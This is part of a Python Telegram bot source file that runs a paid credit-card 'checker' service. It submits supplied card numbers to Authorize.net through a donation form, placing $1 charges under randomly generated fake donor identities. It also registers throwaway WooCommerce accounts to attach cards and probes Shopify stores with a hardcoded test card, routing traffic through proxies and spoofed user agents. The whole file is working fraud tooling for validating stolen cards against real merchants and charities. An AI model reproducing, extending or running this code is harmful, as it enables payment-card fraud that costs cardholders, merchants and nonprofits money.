        state = random.choice(states)
        zipcode = random.choice(["10001", "90210", "60601", "77001", "85001"])
        email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"
        return {"first": first, "last": last, "email": email, "address": street, "city": city, "state": state, "zip": zipcode}

    def tokenize_and_charge(cc_num: str, mm: str, yy: str, cvv: str, proxy_str: str = None) -> dict:
        import requests, json, re, time
        session = requests.Session()
        if proxy_str:
            session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
                               "Accept-Language": "en-US,en;q=0.9"})
        try:
            session.get(f"{AUTHORIZE_SITE}/donate/?form-id={AUTHORIZE_FORM_ID}", timeout=20)
            expire_token = f"{mm}{yy[-2:]}"
            timestamp = str(int(time.time() * 1000))
            payload = {"securePaymentContainerRequest": {"merchantAuthentication": {"name": AUTHORIZE_API_LOGIN_ID, "clientKey": AUTHORIZE_CLIENT_KEY},
                        "data": {"type": "TOKEN", "id": timestamp, "token": {"cardNumber": cc_num, "expirationDate": expire_token, "cardCode": cvv}}}}
            headers = {"Content-Type": "application/json", "Origin": AUTHORIZE_SITE, "Referer": f"{AUTHORIZE_SITE}/", "User-Agent": ua}
            resp = session.post(AUTHORIZE_API_URL, json=payload, headers=headers, timeout=20)
            data = resp.json()
            if data.get("messages", {}).get("resultCode") != "Ok":
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization failed")
                return {"status": "ERROR", "msg": msg}
            descriptor = data["opaqueData"]["dataDescriptor"]
            value = data["opaqueData"]["dataValue"]
            donor = random_donor()
            post_data = {
                "give-form-id": AUTHORIZE_FORM_ID, "give-form-title": "Donate",
                "give-current-url": f"{AUTHORIZE_SITE}/donate/?form-id={AUTHORIZE_FORM_ID}",
                "give-form-url": f"{AUTHORIZE_SITE}/donate/", "give-form-minimum": "1.00",
                "give-form-maximum": "999999.00", "give-amount": "1.00", "payment-mode": "authorize",
                "give_first": donor["first"], "give_last": donor["last"], "give_email": donor["email"],
                "give_authorize_data_descriptor": descriptor, "give_authorize_data_value": value,
                "give_action": "purchase", "give-gateway": "authorize", "card_address": donor["address"],
                "card_city": donor["city"], "card_state": donor["state"], "card_zip": donor["zip"],
                "billing_country": "US", "card_number": "0000000000000000", "card_cvc": "000",
                "card_name": "0000000000000000", "card_exp_month": "00", "card_exp_year": "00", "card_expiry": "00 / 00"
            }
            page_resp = session.get(f"{AUTHORIZE_SITE}/donate/?form-id={AUTHORIZE_FORM_ID}", timeout=20)
            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_resp.text)
            if hash_match:
                post_data["give-form-hash"] = hash_match.group(1)
            else:
                return {"status": "ERROR", "msg": "Could not find give-form-hash"}
            resp = session.post(f"{AUTHORIZE_SITE}/donate/?payment-mode=authorize&form-id={AUTHORIZE_FORM_ID}", data=post_data, timeout=30)
            text_lower = resp.text.lower()
            if "donation confirmation" in text_lower or "thank you" in text_lower or "payment complete" in text_lower:
                return {"status": "CHARGED", "msg": "Payment Successful!"}
            elif "declined" in text_lower:
                err_match = re.search(r'class="give_error">(.*?)<', resp.text)
                err = err_match.group(1) if err_match else "Transaction Declined"
                return {"status": "DECLINED", "msg": err}
            else:
                return {"status": "DECLINED", "msg": "Unknown Response"}
        except Exception as e:
            return {"status": "ERROR", "msg": str(e)[:100]}

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, tokenize_and_charge, card['number'], card['mm'], card['yy'], card['cvc'], proxy)
    status_map = {"CHARGED": "CHARGED", "APPROVED": "APPROVED", "DECLINED": "DECLINED", "ERROR": "ERROR"}
    final_status = status_map.get(result.get("status", "ERROR"), "DECLINED")
    return {'status': final_status, 'message': result.get("msg", "Unknown error"), 'gateway': 'Authorize.net', 'price': '$1.00', 'card': cc_str}

# ================== AUTHORIZE.NET AUTH ==================
async def check_authorize_auth_card(cc_str: str, proxy: str = None) -> dict:
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Authorize Auth', 'price': '$0.00', 'card': cc_str}

    def auth_sync(cc_num: str, mm: str, yy: str, cvv: str, proxy_str: str = None) -> dict:
        import requests, re, time, random, uuid, fake_useragent
        BASE_URL = AUTHORIZE_AUTH_SITE
        LOGIN_URL = AUTHORIZE_AUTH_LOGIN_URL
        ADD_PAYMENT_URL = AUTHORIZE_AUTH_ADD_PAYMENT_URL

        def generate_random_data():
            unique_id = str(uuid.uuid4())[:8]
            email = f"user_{unique_id}@example.com"
            password = f"Pass_{unique_id}!"
            return email, password

        session = requests.Session()
        if proxy_str:
            session.proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        ua = fake_useragent.UserAgent().random
        session.headers.update({"User-Agent": ua})
        try:
            email, password = generate_random_data()
            resp = session.get(LOGIN_URL, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            if not nonce_match:
                return {"status": "ERROR", "msg": "Registration nonce not found"}
            nonce = nonce_match.group(1)
            payload = {"email": email, "password": password, "woocommerce-register-nonce": nonce,
                      "_wp_http_referer": "/my-account/", "register": "Register"}
            resp = session.post(LOGIN_URL, data=payload, timeout=30)
            if "Logout" not in resp.text and "Dashboard" not in resp.text and "My Account" not in resp.text:
                return {"status": "ERROR", "msg": "Registration failed – site may be down"}
        except Exception as e:
            return {"status": "ERROR", "msg": f"Registration error: {str(e)[:100]}"}
        try:
            exp_formatted = f"{mm} / {yy[-2:]}"
            resp = session.get(ADD_PAYMENT_URL, timeout=20)
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
            if not nonce_match:
                return {"status": "ERROR", "msg": "Add payment nonce not found"}
            nonce = nonce_match.group(1)
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc_num.replace(" ", "+"),
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "yith_wcauthnet_credit_card_gateway-card-type": "",
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            resp = session.post(ADD_PAYMENT_URL, data=payload, timeout=30)
            if "Payment method successfully added" in resp.text:
                return {"status": "CHARGED", "msg": "Payment method added successfully"}
            elif "declined" in resp.text.lower():
                err_match = re.search(r'class="woocommerce-error" role="alert">(.*?)</ul>', resp.text, re.DOTALL)
                err = re.sub('<[^<]+?>', '', err_match.group(1)).strip() if err_match else "Card declined"
                return {"status": "DECLINED", "msg": err}
            else:
                return {"status": "DECLINED", "msg": "Unknown response – likely declined"}
        except Exception as e:
            return {"status": "ERROR", "msg": f"Payment addition error: {str(e)[:100]}"}

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, auth_sync, card['number'], card['mm'], card['yy'], card['cvc'], proxy)
    status_map = {"CHARGED": "CHARGED", "APPROVED": "APPROVED", "DECLINED": "DECLINED", "ERROR": "ERROR"}
    final_status = status_map.get(result.get("status", "ERROR"), "DECLINED")
    return {'status': final_status, 'message': result.get("msg", "Unknown error"), 'gateway': 'Authorize Auth', 'price': '$0.00', 'card': cc_str}

# ================== TEST PROXY ==================
async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"
    try:
        from urllib.parse import quote
        params = {'cc': test_card, 'site': test_site, 'proxy': quote(proxy, safe='')}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(PROXY_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response = raw.get('Response', '').lower()
        if 'proxy dead' in response or 'invalid proxy' in response or 'no proxy' in response:
            return False
        return True
    except:
        return False

# ================== TEST SITE FUNCTION ==================
async def test_site(site: str):
    test_card = "5154623245618097|03|2032|156"
    api_settings = load_api_settings()
    apis = api_settings.get('shopify_proxyless_apis', [PROXYLESS_API_1, PROXYLESS_API_2])
    
    for api_url in apis:
        try:
            if api_url == PROXYLESS_API_1:
                full_url = f"{api_url}?site={site}&cc={test_card}"
            else:
                full_url = f"{api_url}?cc={test_card}&site={site}"
            timeout = aiohttp.ClientTimeout(total=60)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(full_url) as resp:
                    if resp.status != 200:
                        continue
                    raw = await resp.json(content_type=None)
            response_msg = raw.get('Response', '')
            if is_dead_site_error(response_msg):
                return {'site': site, 'status': 'dead'}
            return {'site': site, 'status': 'alive'}
        except Exception:
            continue
    return {'site': site, 'status': 'dead'}

# ================== BOT COMMANDS ==================
@dp.message(Command("start"))
async def start_command(message: Message):
    user_id = message.from_user.id
    add_user_for_broadcast(user_id)
    
    if await is_banned_user(user_id):
        return await message.reply(f"{get_live_emoji('cross')} {bold_text('You are banned!')}")
    
    msg_text = f"""{get_live_emoji('storm')} <b>{bold_text('Welcome')}</b>
<b>{bold_text('ATUL FROXT')}</b>

<b>{bold_text('This bot promises you fast and safe checkups with different gateways!')}</b> 🚀

🔹 <b>{bold_text('Bot Dev')}</b> → <b>ATUL FROXT</b>
<b>{bold_text('Version')}</b> → <b>3.0</b> <i>(Constantly Upgrading...)</i>

{get_live_emoji('clock')} <b>{datetime.now().strftime('%I:%M %p')}</b>"""
    
    await message.reply(premium_emoji(msg_text), reply_markup=get_main_menu())

# ================== CALLBACK HANDLERS ==================
@dp.callback_query(lambda c: c.data == "back_main")
async def back_main(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('storm')} <b>{bold_text('Welcome')}</b>
<b>{bold_text('ATUL FROXT')}</b>

<b>{bold_text('This bot promises you fast and safe checkups with different gateways!')}</b> 🚀

🔹 <b>{bold_text('Bot Dev')}</b> → <b>ATUL FROXT</b>
<b>{bold_text('Version')}</b> → <b>3.0</b> <i>(Constantly Upgrading...)</i>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "gates_menu")
async def gates_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('storm')} <b>{bold_text('GATES')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bold_text('~ Froxt Shopify')}</b>

{get_live_emoji('sword')} - <b>{bold_text('Total Gates')}</b> ⚔️ <b>12</b> {get_live_emoji('medal')}
{get_live_emoji('shield')} - <b>{bold_text('Auth Gates')}</b> ⚔️ <b>3</b> {get_live_emoji('medal')}
{get_live_emoji('fire')} - <b>{bold_text('Charged Gates')}</b> ⚔️ <b>9</b> {get_live_emoji('medal')}

<b>{bold_text('Choose gate type below.')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_gates_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "auth_menu")
async def auth_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('shield')} <b>{bold_text('AUTH GATES')}</b> <b>{bold_text('~ Froxt Shopify')}</b>

<b>{bold_text('SELECT AN AUTH GATE')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_auth_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "stripe_auth_menu")
async def stripe_auth_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('shield')} <b>{bold_text('STRIPE AUTH')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_stripe_auth_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "braintree_menu")
async def braintree_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('shield')} <b>{bold_text('BRAINTREE AUTH')}</b> <b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_braintree_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "charge_menu")
async def charge_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('fire')} <b>{bold_text('CHARGE GATES')}</b>
<b>{bold_text('~ Froxt Shopify')}</b>

<b>{bold_text('SELECT A CHARGE GATE')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_charge_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "shopify_menu")
async def shopify_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('gate')} <b>{bold_text('SHOPIFY')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_shopify_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "razorpay_menu")
async def razorpay_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('gate')} <b>{bold_text('RAZORPAY')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_razorpay_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "account_menu")
async def account_menu_cb(callback: CallbackQuery):
    user_id = callback.from_user.id
    is_prem = is_premium(user_id)
    msg_text = f"""{get_live_emoji('user')} <b>{bold_text('ACCOUNT')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>

👤 <b>User ID:</b> <code>{user_id}</code>
{get_live_emoji('crown')} <b>Premium:</b> {'✅ Active' if is_prem else '❌ Inactive'}"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_account_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "tools_menu")
async def tools_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('tools')} <b>{bold_text('TOOLS')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_tools_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "plans_menu")
async def plans_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('plan')} <b>{bold_text('PLANS')}</b>

<b>{bold_text('~ Froxt Shopify [PLANS]')}</b>

{get_live_emoji('crown')} <b>1 Day Access</b> - <b>₹20</b> or <b>20 Stars</b>
{get_live_emoji('crown')} <b>1 Week Access</b> - <b>₹100/$4.00</b> or <b>100 Stars</b>
{get_live_emoji('crown')} <b>1 Month Access</b> - <b>₹300/$15.00</b> or <b>300 Stars</b>
{get_live_emoji('crown')} <b>2 Month Access</b> - <b>₹550/$30.00</b> or <b>550 Stars</b>

<b>{bold_text('To Proceed With Your Purchase Contact - @DARK_FROXT_73')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_plans_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "profile_info")
async def profile_info_cb(callback: CallbackQuery):
    user_id = callback.from_user.id
    is_prem = is_premium(user_id)
    stats = await get_user_stats(user_id)
    msg_text = f"""{get_live_emoji('user')} <b>{bold_text('PROFILE')}</b>

<b>━━━━━━━━━━━━━━━━━</b>
👤 <b>User ID:</b> <code>{user_id}</code>
{get_live_emoji('crown')} <b>Premium:</b> {'✅ Active' if is_prem else '❌ Inactive'}
📊 <b>Stats:</b>
  • Checked: {stats.get('checked', 0)}
  • Charged: {stats.get('charged', 0)}
  • Approved: {stats.get('approved', 0)}
  • Declined: {stats.get('declined', 0)}
<b>━━━━━━━━━━━━━━━━━</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_account_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "proxy_menu")
async def proxy_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('proxy')} <b>{bold_text('PROXY MANAGEMENT')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_proxy_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "sites_menu")
async def sites_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('tools')} <b>{bold_text('SITES MANAGEMENT')}</b>

<b>{bold_text('~ Froxt Shopify')}</b>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_sites_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "close_menu")
async def close_menu_cb(callback: CallbackQuery):
    await callback.message.delete()
    await callback.answer()

@dp.callback_query(lambda c: c.data == "redeem_menu")
async def redeem_menu_cb(callback: CallbackQuery):
    msg_text = f"""{get_live_emoji('key')} <b>{bold_text('REDEEM')}</b>

{bold_text('Send the code you received to activate premium.')}
{bold_text('Format:')} <code>/redeem CODE</code>"""
    await callback.message.edit_text(premium_emoji(msg_text), reply_markup=get_account_menu())
    await callback.answer()

# ================== SIMPLE COMMAND HANDLERS ==================
@dp.message(Command("redeem"))
async def redeem_command(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) < 2:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Usage:')} <code>/redeem CODE</code>")
        return
    code = args[1].strip()
    
    codes = load_json(REDEEM_FILE, {})
    if code not in codes:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Invalid code!')}")
        return
    entry = codes[code]
    if entry.get("used_by") is not None:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Code already used!')}")
        return
    if entry.get("expiry", 0) < time.time():
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Code expired!')}")
        return
    
    entry["used_by"] = user_id
    codes[code] = entry
    save_json(REDEEM_FILE, codes)
    
    days = entry.get("value", 30)
    await add_premium_user(user_id, days, "Premium")
    await message.reply(f"{get_live_emoji('check')} {bold_text('Premium activated for')} {days} {bold_text('days!')}")

# ================== PROXY MANAGEMENT COMMANDS ==================
@dp.message(Command("addpxy"))
async def add_proxy_command(message: Message):
    user_id = message.from_user.id
    if not is_premium(user_id) and user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Premium only.')}")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Usage:')} <code>/addpxy ip:port:username:password</code>")
        return
    proxy_str = args[1].strip()
    proxies = load_proxies()
    if proxy_str in proxies:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Proxy already exists!')}")
        return
    status_msg = await message.reply(f"{get_live_emoji('check')} {bold_text('Checking proxy...')}")
    if await test_proxy(proxy_str):
        proxies.append(proxy_str)
        save_proxies(proxies)
        await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text('Proxy added successfully!')}\n\n<code>{proxy_str}</code>")
    else:
        await status_msg.edit_text(f"{get_live_emoji('cross')} {bold_text('Proxy is dead! Not added.')}")

@dp.message(Command("rmproxy"))
async def remove_proxy_command(message: Message):
    user_id = message.from_user.id
    if not is_premium(user_id) and user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Premium only.')}")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Usage:')} <code>/rmproxy ip:port</code>")
        return
    proxy_to_remove = args[1].strip()
    proxies = load_proxies()
    if proxy_to_remove not in proxies:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Proxy not found.')}")
        return
    proxies.remove(proxy_to_remove)
    save_proxies(proxies)
    await message.reply(f"{get_live_emoji('check')} {bold_text('Proxy removed!')}")

@dp.message(Command("clearproxy"))
async def clear_proxy_command(message: Message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Owner only.')}")
        return
    proxies = load_proxies()
    if not proxies:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('No proxies to clear.')}")
        return
    save_proxies([])
    await message.reply(f"{get_live_emoji('check')} {bold_text(f'Cleared {len(proxies)} proxies!')}")

@dp.message(Command("proxy"))
async def check_proxy_command(message: Message):
    user_id = message.from_user.id
    if not is_premium(user_id) and user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Premium only.')}")
        return
    proxies = load_proxies()
    if not proxies:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('No proxies to check.')}")
        return
    
    status_msg = await message.reply(f"{get_live_emoji('check')} {bold_text(f'Checking {len(proxies)} proxies...')}")
    alive, dead = [], []
    total = len(proxies)
    for i, proxy in enumerate(proxies):
        if await test_proxy(proxy):
            alive.append(proxy)
        else:
            dead.append(proxy)
        await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text(f'Checked {i+1}/{total}')}\n✅ Alive: {len(alive)} | ❌ Dead: {len(dead)}")
        await asyncio.sleep(0.3)
    
    save_proxies(alive)
    await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text('Proxy check complete!')}\n\n✅ Alive: {len(alive)}\n❌ Dead removed: {len(dead)}")

# ================== SITE MANAGEMENT COMMANDS ==================
@dp.message(Command("addsite"))
async def add_site_command(message: Message):
    user_id = message.from_user.id
    if not is_premium(user_id) and user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Premium only.')}")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Usage:')} <code>/addsite https://site.com</code>")
        return
    site_url = args[1].strip()
    if not (site_url.startswith('http://') or site_url.startswith('https://')):
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Invalid URL. Must start with http:// or https://')}")
        return
    sites = load_sites()
    if site_url in sites:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Site already exists.')}")
        return
    status_msg = await message.reply(f"{get_live_emoji('check')} {bold_text('Checking site...')}")
    try:
        result = await test_site(site_url)
        if result['status'] == 'alive':
            sites.append(site_url)
            async with aiofiles.open(SITES_FILE, 'w') as f:
                for s in sites:
                    await f.write(f"{s}\n")
            await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text('Site added successfully!')}\n\n<code>{site_url}</code>")
        else:
            await status_msg.edit_text(f"{get_live_emoji('cross')} {bold_text('Site is dead! Not added.')}")
    except Exception as e:
        await status_msg.edit_text(f"{get_live_emoji('cross')} {bold_text(f'Error: {e}')}")

@dp.message(Command("rm"))
async def remove_site_command(message: Message):
    user_id = message.from_user.id
    if not is_premium(user_id) and user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Premium only.')}")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Usage:')} <code>/rm https://site.com</code>")
        return
    site_to_remove = args[1].strip()
    sites = load_sites()
    if site_to_remove not in sites:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('Site not found.')}")
        return
    sites.remove(site_to_remove)
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in sites:
            await f.write(f"{s}\n")
    await message.reply(f"{get_live_emoji('check')} {bold_text('Site removed!')}")

@dp.message(Command("fuck"))
async def remove_dead_sites_command(message: Message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        await message.reply(f"{get_live_emoji('cross')} {bold_text('Access Denied. Owner only.')}")
        return
    sites = load_sites()
    if not sites:
        await message.reply(f"{get_live_emoji('warning')} {bold_text('No sites to check.')}")
        return
    
    status_msg = await message.reply(f"{get_live_emoji('check')} {bold_text(f'Checking {len(sites)} sites...')}")
    alive, dead = [], []
    total = len(sites)
    for i, site in enumerate(sites):
        result = await test_site(site)
        if result['status'] == 'alive':
            alive.append(site)
        else:
            dead.append(site)
        await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text(f'Checked {i+1}/{total}')}\n✅ Alive: {len(alive)} | ❌ Dead: {len(dead)}")
        await asyncio.sleep(0.3)
    
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in alive:
            await f.write(f"{site}\n")
    
    await status_msg.edit_text(f"{get_live_emoji('check')} {bold_text('Site check complete!')}\n\n✅ Alive: {len(alive)}\n❌ Dead removed: {len(dead)}")

# ================== RUN BOT ==================
async def main():
    print("⚡ Storm Shopify Bot Started! (Aiogram Version)")
    print("📋 All gateways loaded.")
    print("👑 Owner ID:", OWNER_ID)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
